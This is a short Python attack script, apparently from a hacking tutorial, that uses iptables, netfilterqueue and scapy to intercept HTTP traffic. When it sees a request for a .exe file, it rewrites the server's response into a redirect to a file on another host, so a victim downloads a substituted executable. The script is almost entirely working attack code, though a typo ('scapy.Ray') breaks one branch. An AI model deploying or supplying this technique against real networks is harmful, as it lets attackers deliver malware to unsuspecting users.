#!/usr/bin/env python

#Work Locally
#sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
#sudo iptables -I INPUT -j NFQUEUE --queue-num 0

from netfilterqueue import NetfilterQueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum

	return packet


def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw): #if recieved raw data
		if scapy_packet[scapy.TCP].dport == 80:#Request
			print("HTTP Request")
			if ".exe" in str(scapy_packet[scapy.Ray].load):
				print("[+] exe Request")
				ack_list.append(scapy_packet[scapy.TCP].ack)
		elif scapy_packet[scapy.TCP].sport == 80:
			print("HTTP Response")
			if scapy_packet[scapy.TCP].seq in ack_list:
				ack_list.remove(scapy_packet[scapy.TCP].seq)
				print("[+] Replacing File")
				modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\n Location: http://someotherfilelocation.com/file.exe\n\n")

				packet.set_payload(bytes(modified_packet))
	packet.accept()


nfqueue = NetfilterQueue()
nfqueue.bind(0, process_packet)

try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()